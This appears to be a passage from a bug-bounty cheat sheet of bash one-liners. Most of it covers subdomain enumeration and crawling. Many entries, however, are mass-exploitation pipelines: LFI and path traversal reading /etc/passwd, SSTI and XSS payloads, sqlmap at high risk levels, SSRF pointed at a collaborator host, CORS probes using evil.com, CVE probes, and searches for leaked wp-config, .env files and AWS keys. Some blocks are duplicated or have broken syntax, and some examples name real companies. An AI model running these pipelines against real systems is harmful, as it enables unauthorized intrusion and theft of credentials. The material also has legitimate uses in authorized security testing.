export domain="HOST"; curl "https://tls.bufferover.run/dns?q=$domain" | jq -r .Results'[]' | rev | cut -d ',' -f1 | rev | sort -u | grep "\.$domain"
```
**Get Subdomains from Riddler.io**
```bash
curl -s "https://riddler.io/search/exportcsv?q=pld:HOST" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 
```
**Get Subdomains from VirusTotal**
```bash
curl -s "https://www.virustotal.com/ui/domains/HOST/subdomains?limit=40" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```
**Get Subdomain with cyberxplore**
```bash
curl https://subbuster.cyberxplore.com/api/find?domain=HOST -s | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" 
```
**Get Subdomains from CertSpotter**
```bash
curl -s "https://certspotter.com/api/v1/issuances?domain=HOST&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 
```
**Get Subdomains from Archive**
```bash
curl -s "http://web.archive.org/cdx/search/cdx?url=*.HOST/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u
```
**Get Subdomains from JLDC**
```bash
curl -s "https://jldc.me/anubis/subdomains/HOST" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```
**Get Subdomains from securitytrails**
```bash
curl -s "https://securitytrails.com/list/apex_domain/HOST" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".HOST" | sort -u
```
**Bruteforcing Subdomain using DNS Over**
```bash
while read sub; do echo "https://dns.google.com/resolve?name=$sub.HOST&type=A&cd=true" | parallel -j100 -q curl -s -L --silent  | grep -Po '[{\[]{1}([,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]|".*?")+[}\]]{1}' | jq | grep "name" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".HOST" | sort -u ; done < FILE.txt
```
**Get Subdomains With sonar.omnisint.io**
```bash
curl --silent https://sonar.omnisint.io/subdomains/HOST | grep -oE "[a-zA-Z0-9._-]+\.HOST" | sort -u 
```
**Get Subdomains With synapsint.com**
```bash
curl --silent -X POST https://synapsint.com/report.php -d "name=https%3A%2F%2FHOST" | grep -oE "[a-zA-Z0-9._-]+\.HOST" | sort -u 
```
**Get Subdomains from crt.sh**
```bash
curl -s "https://crt.sh/?q=%25.HOST&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```
**Sort & Tested Domains from Recon.dev**
```bash
curl "https://recon.dev/api/search?key=apikey&domain=HOST" |jq -r '.[].rawDomains[]' | sed 's/ //g' | sort -u | httpx -silent
```
**Subdomain Bruteforcer with FFUF**
```bash
ffuf -u https://FUZZ.HOST -w FILE.txt -v | grep "| URL |" | awk '{print $4}'
```
**Find Allocated IP Ranges for ASN from IP Address**
```bash
whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net IP | grep origin: | awk '{print $NF}' | head -1) | grep -w "route:" | awk '{print $NF}' | sort -n
```
**Extract IPs from a File**
```bash
grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt
```
**Ports Scan without CloudFlare**
```bash
subfinder -silent -d HOST | filter-resolved | cf-check | sort -u | naabu -rate 40000 -silent -verify | httprobe
```
**Create Custom Wordlists**
```bash
gau HOST | unfurl -u keys | tee -a FILE1.txt; gau HOST | unfurl -u paths | tee -a FILE2.txt; sed 's****n**' FILE2.txt | sort -u | tee -a FILE1.txt | sort -u; rm FILE2.txt  | sed -i -e 's/\.css\|\.png\|\.jpeg\|\.jpg\|\.svg\|\.gif\|\.wolf\|\.bmp//g' FILE1.txt
```
```bash
cat HOSTS.txt | httprobe | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a FILE.txt  
```
**Extracts Juicy Informations**
```bash
for sub in $(cat HOSTS.txt); do gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq | egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a OUT.txt  ;done
```
**Find Subdomains TakeOver**
```bash
subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
```
**Dump Custom URLs from ParamSpider**
```bash
cat HOSTS.txt | xargs -I % python3 paramspider.py -l high -o ./OUT/% -d %;
```
**URLs Probing with cURL + Parallel**
```bash
cat HOSTS.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t  Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk
```
**Dump In-scope Assets from** `chaos-bugbounty-list`
```bash
curl -sL https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json | jq -r '.programs[].domains | to_entries | .[].value'
```
**Dump In-scope Assets from `bounty-targets-data`**
**HackerOne Programs**
```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=true | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv'
```
**BugCrowd Programs**
```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```
**Intigriti Programs**
```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/intigriti_data.json | jq -r '.[].targets.in_scope[] | [.endpoint, .type] | @tsv'
```
**YesWeHack Programs**
```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/yeswehack_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```
**HackenProof Programs**
```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/hackenproof_data.json | jq -r '.[].targets.in_scope[] | [.target, .type, .instruction] | @tsv'
```
**Federacy Programs**
```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/federacy_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```
**Dump URLs from sitemap.xml**
```bash
curl -s http://HOST/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'
```
**Pure Bash Linkfinder**
```bash
curl -s $1 | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort | uniq | grep ".js" > FILE.txt; while IFS= read link; do python linkfinder.py -i "$link" -o cli; done < FILE.txt | grep $2 | grep -v $3 | sort -n | uniq; rm -rf FILE.txt
```
**Extract Endpoints from swagger.json**
```bash
curl -s https://HOST/v2/swagger.json | jq '.paths | keys[]'
```
**CORS Misconfiguration**
```bash
site="URL"; gau "$site" | while read url; do target=$(curl -sIH "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found] echo $url; else echo Nothing on "$url"; fi; done
```
**Find Hidden Servers and/or Admin Panels**
```bash
ffuf -c -u URL -H "Host: FUZZ" -w FILE.txt 
```
**Recon Using api.recon.dev**
```bash
curl -s -w "\n%{http_code}" https://api.recon.dev/search?domain=HOST | jg .[].domain
```
**Find Live Host/Domain/Assets**
```bash
subfinder -d HOST -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u
```
**XSS without gf**
```bash
waybackurls HOST | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -sk --path-as-is "$host" | grep -qs "<script>alert(1)</script>" && echo "$host is vulnerable"; done
```
**Get Subdomains from IPs**
```bash
python3 hosthunter.py HOSTS.txt > OUT.txt
```
**Gather Domains from Content-Security-Policy**
```bash
curl -vs URL --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0-9./?=_-]*" |  sed -e '/\./!d' -e '/[^A-Za-z0-9._-]/d' -e 's/^\.//' | sort -u
```
**Nmap IP:PORT Parser Piped to HTTPX**
```bash
nmap -v0 HOST -oX /dev/stdout | jc --xml -p | jq -r '.nmaprun.host | (.address["@addr"] + ":" + .ports.port[]["@portid"])' | httpx --silent
```
**XSS from waybackurls**
```bash
echo https://target.com | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
```
**Local File Inclusion**
```bash
cat hosts | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path
"///////../../../etc/passwd" -mr "root:x" | anew lfi.txt
```
**Wordpress wp-content mysql.sql**
```bash
cat hosts.txt | httpx -c -silent -path "/wp-content/mysql.sql" -mc 200 -t 250 -p 80,443,8080,8443 | anew wp-sql.txt
```
**CVE-2022-22963 SpringShell`00 Status code indicates vulnerability`**
```bash
for host in hosts.txt; do curl $host:port/path?class.module.classLoader.URLs%5B0%5D=0; done
```
**SSRF using dnsx, httpx, gau, qsreplace**
```bash
cat subdomains.txt | dnsx | httpx -silent -threads 1000 | gau | grep "="  |
qsreplace http://hacker.burpcollaborator.net
```
**SQLi using dnsx, httpx, xargs, findomain, waybackurls, gf, sqlmap**
```bash
httpx -l targets.txt -silent -threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1'
```
**Local File Inclusion using gau, gf, xargs**
```bash
cat sudomains.txt | httpx -silent -threads 500 | gau | gf lfi | qsreplace
"/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%"  2>&1 | grep -q "  root:x" && echo " VULN! %"'
```
**CVE-2021-41277 LocalFileInclusion in Metabase**
```bash
cat live.txt | while read host do;do curl --silent --insecure --path-as-is "$host/api/geojson?url=file:///etc/passwd" | grep -qs "root:x" && echo "$host Vulnerable";done
```
**XSS using airixss, waybackurls, gf, uro, httpx, qsreplace**
```bash
echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
```
**Company Sensitive Data using gau**
```bash
cat subdomains.txt | gau | tee gau.txt | grep -E
"\\.xls|\\.xlsx|\\.json|\\.pdf|\\.sql|\\.doc|\\.docx|\\.pptx|\\.mp3|\\.mp4|\\.zip|\\.tar|\\.gzip|\\.rar|\\.json"
| tee sensitive-files.txt
```
**Generate Target Based Wordlist with gau and unfurl**
```bash
cat subdomains.txt | gau | unfurl paths | rev | cut -d '/' -f1 | rev | sort -u | tee wordlist.txt
```
**/api/geojson target IP ranges LFI**
```bash
cat subdomains.txt | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path
"/api/geojson?url=file:///etc/passwd" -mr "root:x" | anew geojson-lfi.txt
```
**Nginx Path Traversal**
```bash
cat subdomains.txt | httpx -silent -path "///////../../../../../../etc/passwd" -sc -mc 200 -mr 'root:x' | anew nginx-traversal.txt
```
**wp-config.php_orig using httpx**
```bash
cat subdomains.txt | httpx -silent -sc -mc 200 -path "/wp-config.php_org" -mr "DB_PASSWORD" | anew wp-config.php_orig
```
**Create your own wordlist from @0xJin**
```bash
cat domains.txt | httpx | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a wordlist.txt
```
**Subdomain Takeover**
```bash
cat domains.txt | assetfinder --subs-only | tee subdomains.txt; subjack -w
subdomains.txt -ssl -t 100 | tee -a takeover.txt | grep -v "Vulnerable"
```
**XSS from waybackurls and qsreplace**
```bash
echo https://target.com
 | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
```

**Local File Inclusion using httpx**
```bash
cat hosts | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path "///////../../../etc/passwd" -mr "root:x" | anew lfi-httpx.txt`
```
**Wordpress Wp-content mysql.sql**
```bash
cat hosts.txt | httpx -c -silent -path "/wp-content/mysql.sql" -mc 200 -t 250 -p 80,443,8080,8443 | anew wp-sql.txt
```
**CVE-2022-22963 SpringShell (400 Code --> Vulnerability)**
```bash
for host in hosts.txt; do curl $host:port/path?class.module.classLoader.URLs%5B0%5D=0; done`
```
**SSRF using dnsx, httpx, gau and qsreplace**
```bash
cat subdomains.txt | dnsx | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://hacker.burpcollaborator.net`
```
**SQLi using dnsx, httpx, xargs, findomain, waybackurls, gf, sqlmap**
```bash
httpx -l targets.txt -silent -threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1'`
```
**Local File Inclusion using Gau, gf, xargs**
```bash
cat sudomains.txt | httpx -silent -threads 500 | gau | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%"  2>&1 | grep -q "  root:x" && echo " VULN! %"'`
```
**CVE-2021-41277 Local File Inclusion in Metabase**
```bash
cat live.txt | while read host do;do curl --silent --insecure --path-as-is "$host/api/geojson?url=file:///etc/passwd" | grep -qs "root:x" && echo "$host Vulnerable";done`
```
**XSS using airixss, waybackurls, gf, uro, httpx, qsreplace**
```bash
echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
```
**Company Sensitive Data using gau**
```bash
cat subdomains.txt | gau | tee gau.txt | grep -E
"\\.xls|\\.xlsx|\\.json|\\.pdf|\\.sql|\\.doc|\\.docx|\\.pptx|\\.mp3|\\.mp4|\\.zip|\\.tar|\\.gzip|\\.rar|\\.json"
| tee sensitive-files.txt`
```
**Generate Target Based Wordlist with gau and unfurl**
```bash
cat subdomains.txt | gau | unfurl paths | rev | cut -d '/' -f1 | rev | sort -u | tee wordlist.txt`
```
**/api/geojson target IP ranges LFI**
```bash
cat subdomains.txt | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path "/api/geojson?url=file:///etc/passwd" -mr "root:x" | anew geojson-lfi.txt
```
**Nginx Path Traversal**
```bash
cat subdomains.txt | httpx -silent -path "///////../../../../../../etc/passwd" -sc -mc 200 -mr 'root:x' | anew nginx-traversal.txt
```
**wp-config.php_orig using httpx**
```bash
cat subdomains.txt | httpx -silent -sc -mc 200 -path "/wp-config.php_org" -mr "DB_PASSWORD" | anew wp-config.php_orig`
```
**Create your own wordlist from @0xJin**
```bash
cat domains.txt | httpx | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a wordlist.txt`
```
**Subdomain Takeover**
```bash
cat domains.txt | assetfinder --subs-only | tee subdomains.txt; subjack -w
subdomains.txt -ssl -t 100 | tee -a takeover.txt | grep -v "Vulnerable"`
```
**Auto scanner**
```bash
subfinder -d site.com -all | naabu | httpx | nuclei -t nuclei-templates
```
**Finding files (For example in here .json file)**
```bash
subfinder -d site.com -all | naabu | httpx | waybackurls | grep -E ".json(?:onp?)?$"
```
**Find interesting subdomain (For example like admin.staging.example.com)**
```bash
subfinder -d site.com -all | dnsprobe -silent | cut -d ' ' -f1 | grep --color 'dmz\|api\|staging\|env\|v1\|stag\|prod\|dev\|stg\|test\|demo\|pre\|admin\|beta\|vpn\|cdn\|coll\|sandbox\|qa\|intra\|extra\|s3\|external\|back'
```
**Find SQL injection at scale**
```bash
subfinder -d site.com -all -silent | waybackurls | sort -u | gf sqli > gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli.txt
```
**Find open redirects at scale**
```bash
subfinder -d site.com -all -silent | waybackurls | sort -u | gf redirect | qsreplace 'https://example.com' | httpx -fr -title --match-string 'Example Domain'
```
**Find SSTI at scale**
```bash
echo "domain" | subfinder -silent | waybackurls | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g | grep  "root:x"
```
**Scanning top exploited vulnerabilities according to CISA**
```bash
subfinder -d site.com -all -silent | httpx -silent | nuclei -rl 50 -c 15 -timeout 10 -tags cisa -vv
```
**Bruteforce subdomains**
```bash
subfinder -d site.com -all -silent | httpx -silent | hakrawler | tr "[:punct:]" "\n" | sort -u > wordlist.txt

puredns bruteforce wordlist.txt site.com -r resolvers.txt -w output.txt
```
**Finding Cross-Site Scripting (XSS) using KnoXSS API**
```bash
echo "domain" | subfinder -silent | gauplus | grep "=" | uro | gf xss | awk '{ print "curl https://knoxss[.]me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: APIKNOXSS\""}' | sh
```
**CVE-2021-31589**
```bash
cat subs.txt | while read host do; do curl -sk "$host/appliance/login.ns?login%5Bpassword%5D=test%22%3E%3Csvg/onload=alert(document.domain)%3E&login%5Buse_curr%5D=1&login%5Bsubmit%5D=Change%20Password" | grep -qs '"><svg/onload=alert(document.domain)>' && echo "$host: Vuln" || echo "$host: Not Vuln"; done
```
**CVE-2023-29489**
```bash
subfinder -d target.com -silent -all | httpx -silent -ports http:80,https:443,2082,2083 -path 'cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">aaaaaaaaaa' -mc 400
``` 
**Clean list of host, port, and version**
```bash
mkdir nmap; cat targets.txt | parallel -j 35 nmap {} -sTVC -host-timeout 15m -oN nmap/{} -p 22,80,443,8080 --open > /dev/null 2>&1; cd nmap; grep -Hari "/tcp" | tee -a ../services.txt; cd ../
```
**Waybackurls validator**
```bash
waybackurls http://example.com | grep "url" | xargs -n 1 curl -s -o /dev/null -w "%{http_code} > %{url_effective}\n" | sort
```
**Extract endpoints from JS (Part 1)**
```bash
curl -L -k -s https://www.example.com | tac | sed "s**\\/**/**" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | awk -F '//' '{if(length($2))print "https://"$2}' | sort -fu | xargs -I '%' sh -c "curl -k -s \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\"" | awk -F "['\"]" '{print $2}' | sort -fu
```
**Extract endpoints from JS (Part 2)**
```bash
curl -Lks https://example.com | tac | sed "s**\\/**/**" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"\n**%\";wget --no-check-certificate --quiet \"%\"; basename \"%\" | xargs -I \"**" sh -c 'linkfinder.py -o cli -i **"
```
**Extract endpoints from JS (Part 3)**
```bash
curl -Lks https://example.com | tac | sed "s**\\/**/**" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"\n**%\";wget --no-check-certificate --quiet \"%\";curl -Lks \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"('***)|(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\" | sort -fu" | tr -d "'\""
```
**Extract endpoints from JS (Part 4)**
```bash
curl -Lks https://example.com | tac | sed "s**\\/**/**" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"'**%\";curl -k -s \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"('***)|(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\" | sort -fu" | tr -d "'\""
```
**Find Access Keys for IAM**
```bash
echo example.com | subfinder -silent -all | httpx -silent -path ".env",".mysql_history","echo $(echo $(</dev/stdin) | cut -d "." -f2).sql" -mc 200 -ports 80,443,8080,8443 | grep -E -i "AKIA[A-Z0-9]{16}"
```
**Subdomain enumeration with Spyse API**
```bash
curl -XGET "https://api.sypse.com/v3/data/domain/subdomain?limit=100&offset=100&domain=example.com" -H "Accept: application/json" -H "Authorization: Bearer TOKEN_HERE" 2>/dev/null | jq '.data.items | .[] | .name' | sed -e 's/^"//' -e 's/"$//' | grep example.com
```
**Dalfox scan to bugbounty targets.**
```bash
xargs -a xss-urls.txt -I@ bash -c 'python3 /dir-to-xsstrike/xsstrike.py -u @ --fuzzer'
```
**Dalfox scan to bugbounty targets.**
```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ dalfox url @
```
**Using x8 to Hidden parameters discovery**
```bash
assetfinder domain | httpx -silent | sed -s 's/$/\//' | xargs -I@ sh -c 'x8 -u @ -w params.txt -o enumerate'
```
**Extract .js Subdomains**
```bash
echo "domain" | haktrails subdomains | httpx -silent | getJS --complete | anew JS
echo "domain" | haktrails subdomains | httpx -silent | getJS --complete | tojson | anew JS1
```
**goop to search .git files.**
```bash
xargs -a xss -P10 -I@ sh -c 'goop @'
```
**Using chaos list to enumerate endpoint**
```bash
curl -s https://raw.githubusercontent.com/projectdiscovery/public-bugbounty-programs/master/chaos-bugbounty-list.json | jq -r '.programs[].domains[]' | xargs -I@ sh -c 'python3 paramspider.py -d @'
```
**Using Wingman to search XSS reflect / DOM XSS**
```bash
xargs -a domain -I@ sh -c 'wingman -u @ --crawl | notify'
```
**Search ASN to metabigor and resolvers domain**
```bash
echo 'dod' | metabigor net --org -v | awk '{print $3}' | sed 's/[[0-9]]\+\.//g' | xargs -I@ sh -c 'prips @ | hakrevdns | anew'
```
**Search .json gospider filter anti-burl**
```bash
gospider -s https://twitch.tv --js | grep -E "\.js(?:onp?)?$" | awk '{print $4}' | tr -d "[]" | anew | anti-burl
```
**Search .json subdomain**
```bash
assetfinder http://tesla.com | waybackurls | grep -E "\.json(?:onp?)?$" | anew 
```
**SonarDNS extract subdomains**
```bash
wget https://opendata.rapid7.com/sonar.fdns_v2/2021-02-26-1614298023-fdns_a.json.gz ; gunzip 2021-02-26-1614298023-fdns_a.json.gz ; cat 2021-02-26-1614298023-fdns_a.json | grep ".DOMAIN.com" | jq .name | tr '" " "' " / " | tee -a sonar
```
**Kxss to search param XSS**
```bash
echo http://testphp.vulnweb.com/ | waybackurls | kxss
```
**Recon subdomains and gau to search vuls DalFox**
```bash
assetfinder testphp.vulnweb.com | gau |  dalfox pipe
```
**Recon subdomains and Screenshot to URL using gowitness**
```bash
assetfinder -subs-only army.mil | httpx -silent -timeout 50 | xargs -I@ sh -c 'gowitness single @' 
```
**Extract urls to source code comments**
```bash
cat urls1 | html-tool comments | grep -oE '\b(https?|http)://[-A-Za-z0-9+&@**%?=~_|!:,.;]*[-A-Za-z0-9+&@**%=~_|]' 
```
** Axiom recon "complete"**
```bash
findomain -t domain -q -u url ; axiom-scan url -m subfinder -o subs --threads 3 ; axiom-scan subs -m httpx -o http ; axiom-scan http -m ffuf --threads 15 -o ffuf-output ; cat ffuf-output | tr "," " " | awk '{print $2}' | fff | grep 200 | sort -u 
```
**Domain subdomain extraction**
```bash
cat url | haktldextract -s -t 16 | tee subs.txt ; xargs -a subs.txt -I@ sh -c 'assetfinder -subs-only @ | anew | httpx -silent  -threads 100 | anew httpDomain'
```
**Search .js using**
```bash
assetfinder -subs-only DOMAIN -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | awk '{print $3}' | grep -E "\.js(?:onp?)?$" | anew
```

- [Explaining command](https://bit.ly/3sD0pLv)

```bash
cat dominios | gau |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> gauJS.txt ; cat dominios | waybackurls | grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> waybJS.txt ; gospider -a -S dominios -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s**] \- **n**" >> gospiderJS.txt ; cat gauJS.txt waybJS.txt gospiderJS.txt | sort -u >> saidaJS ; rm -rf *.txt ; cat saidaJS | anti-burl |awk '{print $4}' | sort -u >> AliveJs.txt ; xargs -a AliveJs.txt -n 2 -I@ bash -c "echo -e '\n[URL]: @\n'; python3 linkfinder.py -i @ -o cli" ; cat AliveJs.txt  | python3 collector.py output ; rush -i output/urls.txt 'python3 SecretFinder.py -i {} -o cli | sort -u >> output/resultJSPASS'
```
**My recon automation simple. OFJAAAH.sh**
```bash
chaos -d $1 -o chaos1 -silent ; assetfinder -subs-only $1 >> assetfinder1 ; subfinder -d $1 -o subfinder1 -silent ; cat assetfinder1 subfinder1 chaos1 >> hosts ; cat hosts | anew clearDOMAIN ; httpx -l hosts -silent -threads 100 | anew http200 ; rm -rf chaos1 assetfinder1 subfinder1
```
**Download all domains to bounty chaos**
```bash
curl https://chaos-data.projectdiscovery.io/index.json | jq -M '.[] | .URL | @sh' | xargs -I@ sh -c 'wget @ -q'; mkdir bounty ; unzip '*.zip' -d bounty/ ; rm -rf *zip ; cat bounty/*.txt >> allbounty ; sort -u allbounty >> domainsBOUNTY ; rm -rf allbounty bounty/ ; echo '@OFJAAAH'
```
**Recon to search SSRF Test**
```bash
findomain -t DOMAIN -q | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://YOUR.burpcollaborator.net
```
**ShuffleDNS to domains in file scan nuclei.**
```bash
xargs -a domain -I@ -P500 sh -c 'shuffledns -d "@" -silent -w words.txt -r resolvers.txt' | httpx -silent -threads 1000 | nuclei -t /root/nuclei-templates/ -o re1
```
**Search Asn Amass**
```bash
amass intel -org paypal -max-dns-queries 2500 | awk -F, '{print $1}' ORS=',' | sed 's/,$//' | xargs -P3 -I@ -d ',' amass intel -asn @ -max-dns-queries 2500''
```
**SQLINJECTION Mass domain file**
```bash
httpx -l domains -silent -threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1'
```
**Using chaos search js**
```bash
chaos -d att.com | httpx -silent | xargs -I@ -P20 sh -c 'gospider -a -s "@" -d 2' | grep -Eo "(http|https)://[^/"].*.js+" | sed "s**
```
**Search Subdomain using Gospider**
```bash
gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
```
**Using gospider to chaos**
```bash
chaos -d paypal.com -bbq -filter-wildcard -http-url | xargs -I@ -P5 sh -c 'gospider -a -s "@" -d 3'
```
**Using recon.dev and gospider crawler subdomains**
```bash
curl "https://recon.dev/api/search?key=apiKEY&domain=paypal.com" |jq -r '.[].rawDomains[]' | sed 's/ //g' | anew |httpx -silent | xargs -P3 -I@ gospider -d 0 -s @ -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
```
**PSQL - search subdomain using cert.sh**
```bash
psql -A -F , -f querycrt -h http://crt.sh -p 5432 -U guest certwatch 2>/dev/null | tr ', ' '\n' | grep twitch | anew
```
**Search subdomains using github and httpx**
- [Github-search](https://github.com/gwen001/github-search)
```python
./github-subdomains.py -t APYKEYGITHUB -d domaintosearch | httpx --title
```
**Search SQLINJECTION using qsreplace search syntax error**
```bash
grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
```
**Search subdomains using jldc**
```bash
curl -s "https://jldc.me/anubis/subdomains/att.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew
```
**Search subdomains in assetfinder using hakrawler spider to search links in content responses**
```bash
assetfinder -subs-only tesla.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | grep "tesla"
```
**Search subdomains in cert.sh**
```bash
curl -s "https://crt.sh/?q=%25.att.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | httpx -title -silent | anew
```
**Search subdomains in cert.sh assetfinder to search in link /.git/HEAD**
```bash
curl -s "https://crt.sh/?q=%25.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's****.git/HEAD**' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```
```bash
